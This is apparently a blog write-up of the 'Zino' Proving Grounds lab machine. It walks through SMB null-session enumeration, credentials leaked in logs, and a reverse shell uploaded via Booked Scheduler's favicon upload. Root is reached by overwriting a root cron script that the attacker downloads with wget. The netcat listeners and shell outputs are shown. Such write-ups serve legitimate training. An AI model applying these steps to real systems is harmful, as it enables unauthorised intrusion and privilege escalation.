---
layout: post
title: PG | Zino
subtitle: Good introduction to basic fundamentals.
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 14:49 EDT
Nmap scan report for 192.168.182.64
Host is up (0.015s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)
|_  256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open   !~-�U      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.45.185' is not allowed to connect to this MariaDB server
8003/tcp open  http        Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94%I=7%D=10/29%Time=653EA9A5%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.185'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.17 seconds
~~~

## SMB (TCP/139, 445)

SMB allows NULL session authentication and revealed a share named 'zino' which looks like a home directory of a user name zino
~~~shell
┌──(kali㉿kali)-[~/Desktop/Zino]
└─$ smbclient -N -L //192.168.182.64

        Sharename       Type      Comment
        ---------       ----      -------
        zino            Disk      Logs
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP 
~~~

![Zino](/assets/img/ZinoPG(1).png)

I downloaded all files using SMBMap and auth.log revealed credentials for a user peter:chauthtok

![Zino](/assets/img/ZinoPG(2).png)

I attemped to connect to the target via SSH using the peter:peter credentials but it failed
~~~shell
┌──(kali㉿kali)-[~/Desktop/Zino]
└─$ ssh peter@192.168.182.64                           
The authenticity of host '192.168.182.64 (192.168.182.64)' can't be established.
ED25519 key fingerprint is SHA256:WSNy24QYHepwi1q+CCZFt8/GTaVsrE60rmRaacEdSKE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.182.64' (ED25519) to the list of known hosts.
peter@192.168.182.64's password: 
Permission denied, please try again.
~~~

The misc.log file revealed credentials for a PHP session admin:adminadmin

![Zino](/assets/img/ZinoPG(3).png)

## HTTP (TCP/8003)

The web server on port 8003 is hosting a Booked Scheduler software, I entered the credentials found via SMB admin:adminadmin which granted me access

![Zino](/assets/img/ZinoPG(4).png)

I enumerated the website and found an upload parameter favicon.ico I was able to upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to and then navigate to and execute the reverse shell via /booked/Web/custom-favicon.php

![Zino](/assets/img/ZinoPG(5).png)

I started my netcat listener

~~~shell
┌──(kali㉿kali)-[~/Desktop/Zino]
└─$ nc -nvlp 21                                       
listening on [any] 21 ...
~~~

Executed the reverse shell

~~~shell
http://192.168.182.64:8003/booked/Web/custom-favicon.php
~~~

And recieved my initial foothold!

~~~shell
┌──(kali㉿kali)-[~/Desktop/Zino]
└─$ nc -nvlp 21                                       
listening on [any] 21 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.182.64] 39390
Linux zino 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
 16:08:14 up  1:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
~~~

# Privilege Escalation

I started Privilege Escalation enumeration by running linpeas and identified our user had write permissions over a file named cleanup.py that is run by root as a cronjob that runs every 3 minutes

![Zino](/assets/img/ZinoPG(6).png)

I created my own cleanup.py and included a python reverse shell

![Zino](/assets/img/ZinoPG(7).png)

I transferred the file to the target and replacing the existing /var/www/booked/cleanup.py

~~~shell
┌──(kali㉿kali)-[~/Desktop/Zino]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

$ cd /var/www/html/booked
$ wget http://192.168.45.185:139/cleanup.py
--2023-10-29 16:26:35--  http://192.168.45.185:139/cleanup.py
Connecting to 192.168.45.185:139... connected.
HTTP request sent, awaiting response... 200 OK
Length: 236 [text/x-python]
Saving to: 'cleanup.py.1'

     0K                                                       100% 82.1M=0s

2023-10-29 16:26:35 (82.1 MB/s) - 'cleanup.py.1' saved [236/236]
$ mv cleanup.py.1 cleanup.py
~~~

I then started my netcat listener on port 22

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 22               
listening on [any] 22 ...
~~~

Once the cronjob executed the reverse shell in cleanup.py I recieved a root shell!

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 22               
listening on [any] 22 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.182.64] 60766
# whoami
whoami
root
# 
~~~